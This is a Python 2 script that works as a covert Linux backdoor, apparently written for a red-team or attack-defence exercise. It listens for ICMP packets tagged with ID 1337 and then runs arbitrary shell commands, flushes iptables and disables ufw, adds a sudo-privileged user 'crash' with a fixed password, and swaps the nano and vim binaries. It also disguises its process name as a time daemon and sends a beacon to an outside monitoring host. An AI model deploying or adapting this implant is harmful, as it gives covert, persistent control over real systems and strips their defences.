import socket
import struct
import os
from sys import argv
import setproctitle
import requests as req

#Everyone else is doing fancy persistance, throw a bone
#Adds user crash:override with root privileges
def persist():
	#We in here?
	try:
	        pwd.getpwnam('crash')
	except KeyError:
	        #Lets get in here
	        create = "useradd crash && echo crash:override | chpasswd crypt-method=SHA512"
	        #elevate
	        elev = "sudo usermod -aG sudo crash"
	        os.system(create)
	        os.system(elev)


#Switches the binaries for nano and vim
def payload():
        print "Payload fired"
        os.system("wall 'firing off payload'")
        os.system("cp /bin/nano /bin/nano.bak")
        os.system("cp /usr/bin/vim /usr/bin/vim.bak")
        os.system("mv /bin/nano /usr/bin/vim")
        os.system("mv /usr/bin/vim.bak /bin/nano")


def parse_command( message ):
	if "write" in message:
		cmd = message.split(",")[1]
		cmd = "echo '" + cmd + "' >> hellofriend"
		os.system(cmd)
	elif "dropfw" in message:
		os.system("iptables -X 2> /dev/null")
		os.system("iptables -F 2> /dev/null")
		os.system("iptables -t nat -F 2> /dev/null")
		os.system("iptables -t nat -X 2> /dev/null")
		os.system("iptables -t mangle -F 2> /dev/null")
		os.system("iptables -t mangle -X 2> /dev/null")
		os.system("iptables -P INPUT ACCEPT 2> /dev/null")
		os.system("iptables -P FORWARD ACCEPT 2> /dev/null")
		os.system("iptables -P OUTPUT ACCEPT 2> /dev/null")
		os.system("ufw disable")
	elif "command" in message:
		cmd = message.split(",")[1]
		os.system(cmd)
	elif "payload" in message:
		payload()
	elif "persist" in message:
		persist()
	else:
	        req.get('http://monitor.daviddworken.com:8080/api/submit?id=%s&virusName=2' % argv[1])
		return


def listen():
	s = socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_ICMP)
	s.setsockopt(socket.SOL_IP, socket.IP_HDRINCL, 1)
	while 1:
		data, addr = s.recvfrom(1508)
		icmp_header = data[20:28]
		dat = data[28:]
		type, code, checksum, p_id, sequence = struct.unpack('bbHHh', icmp_header)
		if p_id == 1337:
			#This is a special message
			parse_command(dat)
		#print "Packet from %r: its id is: %r" % (addr,p_id)


if __name__=="__main__":
        setproctitle.setproctitle("/bin/bash time-ntpd --no-reload")
	id = argv[1]
	listen()